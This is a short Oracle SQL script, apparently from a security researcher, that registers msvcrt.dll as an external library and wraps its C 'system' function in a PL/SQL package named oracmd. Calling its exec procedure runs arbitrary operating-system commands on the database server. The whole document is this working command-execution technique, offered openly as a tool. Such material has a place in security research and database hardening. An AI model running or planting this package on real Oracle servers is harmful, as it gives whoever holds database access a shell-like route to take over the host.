Rem
Rem oracmd.sql 
Rem 
Rem Run system commands via Oracle database servers 
Rem 
Rem Bugs to david@ngssoftware.com 
Rem 

CREATE OR REPLACE LIBRARY exec_shell AS 
'C:\winnt\system32\msvcrt.dll'; 
/ 
show errors 
CREATE OR REPLACE PACKAGE oracmd IS 
PROCEDURE exec (cmdstring IN CHAR); 
end oracmd; 
/ 
show errors 
CREATE OR REPLACE PACKAGE BODY oracmd IS 
PROCEDURE exec(cmdstring IN CHAR) 
IS EXTERNAL 
NAME "system" 
LIBRARY exec_shell 
LANGUAGE C; end oracmd;
/
show errors
